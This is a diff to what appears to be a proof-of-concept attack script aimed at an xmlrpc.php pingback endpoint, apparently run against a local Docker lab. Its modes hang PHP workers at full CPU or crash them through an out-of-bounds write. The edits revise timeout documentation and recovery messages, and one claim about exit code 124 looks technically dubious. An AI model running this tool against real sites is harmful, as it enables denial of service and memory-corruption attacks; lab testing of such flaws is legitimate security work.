@@ -11,8 +11,10 @@ Modes
 -----
 probe   Check that xmlrpc.php exists and exposes pingback.ping.
 hang    Send the 86-byte non-progressing stream.  The PHP worker spins at
-        100% CPU; php-fpm's request_terminate_timeout eventually kills it
-        (SIGTERM, then SIGKILL if the worker ignores the signal).
+        100% CPU.  The stock php-fpm config has no request_terminate_timeout;
+        PHP's FPM max_execution_time (30s) is the fallback and ends the
+        request with exit code 124.  With an explicit request_terminate_timeout
+        the worker is killed earlier with SIGTERM.
 crash   Send the ~23 MB stream.  The decoder performs an out-of-bounds write
         and the PHP worker dies with SIGSEGV.
 
@@ -440,11 +442,15 @@ def main() -> int:
     after = get_text(args.target.rstrip("/") + "/", timeout=5)
     print(f"[*] site after  : {after.short()} (attack took {elapsed:.1f}s)")
 
-    if args.mode == "hang" and after.kind in ("timeout", "connection_error"):
-        print(f"[*] waiting {args.recovery_wait:.0f}s for php-fpm to reap stuck workers ...")
-        time.sleep(args.recovery_wait)
-        recovered = get_text(args.target.rstrip("/") + "/", timeout=8)
-        print(f"[*] site recovered: {recovered.short()}")
+    if args.mode == "hang":
+        if after.kind in ("timeout", "connection_error"):
+            print(f"[*] waiting {args.recovery_wait:.0f}s for php-fpm to reap stuck workers ...")
+            time.sleep(args.recovery_wait)
+            recovered = get_text(args.target.rstrip("/") + "/", timeout=8)
+            print(f"[*] site after wait: {recovered.short()}")
+        print("[*] note: the stock php-fpm config has no request_terminate_timeout;")
+        print("    PHP-FPM max_execution_time (30s) is the fallback. Use")
+        print("    `make restart` to recover immediately.")
 
     if args.show_logs:
         show_logs(args.docker_project, attack_since)
